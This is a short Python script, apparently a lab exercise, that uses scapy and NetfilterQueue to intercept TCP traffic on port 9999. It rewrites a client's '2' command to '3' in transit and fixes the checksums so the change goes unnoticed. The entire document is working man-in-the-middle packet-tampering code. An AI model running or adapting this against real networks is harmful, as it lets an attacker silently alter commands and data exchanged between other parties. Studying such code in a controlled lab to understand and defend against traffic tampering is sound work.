from scapy.all import *
from netfilterqueue import NetfilterQueue

replacement_command = "3"

def modify(packet):
    pkt = IP(packet.get_payload())

    if pkt.haslayer(TCP) and (pkt.sport == 9999 or pkt.dport == 9999):
        if Raw in pkt:
            data = pkt[Raw].load.decode(errors="ignore")  # Розкодовуємо дані
            # print(f"\n[INFO] Intercepted data: {data.strip()}")

            if data.strip() == "2" and pkt.dport == 9999:
                print("[INFO] Replacing '2' with '3'")
                pkt[Raw].load = replacement_command.encode()

                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum

                packet.set_payload(bytes(pkt))
            else:
                # print("[INFO] No modification applied.")
                pass
        else:
            # print("[INFO] No Raw layer found in packet.")
            pass
    else:
        # print("[INFO] Packet does not match TCP or port 9999.")
        pass


    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify)

try:
    print("[*] Waiting for data...")
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[*] Exiting...")
    nfqueue.unbind() 
